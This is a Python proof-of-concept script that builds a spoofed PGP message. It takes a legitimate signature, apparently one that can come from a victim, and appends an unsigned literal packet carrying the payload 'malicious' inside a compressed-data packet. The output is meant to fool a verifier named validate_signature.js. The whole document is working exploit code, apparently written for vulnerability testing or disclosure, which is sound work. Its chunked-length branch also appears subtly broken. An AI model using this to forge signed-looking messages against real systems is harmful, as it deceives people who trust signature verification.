import textwrap
import struct
import base64
import sys

# First, make a legitimate signature using gpg (no compression, binary output):
#     echo "hello world" | gpg -s -z0 > legit_signature.pgp
# (or extract this from a signature taken from the "victim")
#
# Then, run this script
#     python generate_spoofed_message.py
#
# The output can then be used with `validate_signature.js`.

def make_header(type):
    return (0b11000000 | type).to_bytes()

def make_length_and_data(data):
    l = len(data)
    if l <= 191:
         # 1-octet
        return l.to_bytes() + data
    elif l <= 8383:
        # 2-octet
        return (((l - 192) >> 8) + 192).to_bytes() + ((l - 192) & 0xFF).to_bytes() + data
    elif l <= 0xFFFFFFFF:
        # 5-octet
        return b"\xFF" + struct.pack(">I", l) + data
    else:
        # partial, output chunks of 2**16 == (1 << (0xf0 & 0x1f))
        partials = bytearray()
        while l > 0x10000:
            partials += b"\xf0"
            data = data[:0x10000]
            partials += data
            l -= 0x10000
        # remainder may not be a partial type length (it will not be as it's < 0x10000)
        return partials + make_length_and_data(data)

def make_literal(payload):
    data = bytearray()
    data += b"b" # binary
    data += b"\x00" # filename
    data += b"\x00\x00\x00\x00" # timestamp
    data += payload
    return make_header(11) + make_length_and_data(data)

def make_compressed(algo, payload):
    data = bytearray()
    data += algo.to_bytes() # algorithm (0 = uncompressed, 1 = zip, 2 = zlib, 3 = bzip2)
    data += payload
    return make_header(8) + make_length_and_data(data)


with open(sys.argv[1], "rb") as legit_signature_file:
    legit_signature = legit_signature_file.read()
    out = legit_signature + make_compressed(0, make_literal(b"malicious"))

    print("-----BEGIN PGP MESSAGE-----\n")
    print(textwrap.fill(base64.b64encode(out).decode("utf-8"), width=64))
    print("-----END PGP MESSAGE-----")